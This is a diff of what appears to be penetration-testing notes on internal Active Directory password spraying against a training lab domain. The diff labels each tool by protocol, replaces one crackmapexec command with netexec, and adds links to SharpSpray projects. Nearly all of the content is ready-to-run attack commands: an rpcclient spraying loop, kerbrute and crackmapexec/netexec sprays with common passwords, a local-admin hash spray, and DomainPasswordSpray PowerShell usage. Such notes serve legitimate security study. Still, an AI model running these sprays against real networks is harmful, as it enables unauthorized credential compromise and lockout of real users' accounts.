@@ -240,19 +240,19 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 
 ### Internal Password Spraying
 **From Linux**
-- bash
+- bash  (against smb)
 ```shell
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
-- Kerbrute 
+- Kerbrute (against kerberos)
 ```shell
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
 ```
-- crackMapExec  / netexec
+- crackMapExec  / netexec (against smb or ldap)
 ```shell
 sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 
-sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+sudo netexec ldap -u valid_users.txt  -p Password123 
 ```
 #### Notes 
 1) It is worth targeting high-value hosts such as SQL or Microsoft Exchange servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.
@@ -266,7 +266,7 @@ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de
 
 **From Windows**
 
-- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
+- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (against ldap)
 ```powershell
 Import-Module .\DomainPasswordSpray.ps1
 # if domain joined
@@ -274,6 +274,9 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 # if not domain joined
 Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt  
 ```
-- Kerbrute 
+- [SharpSpray from jnqpblc](https://github.com/jnqpblc/SharpSpray) (against ldap)
+- [SharpSpray from iomoath](https://github.com/iomoath/SharpSpray) (against ldap)
+
+- Kerbrute (against kerberos)
 ```powershell
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
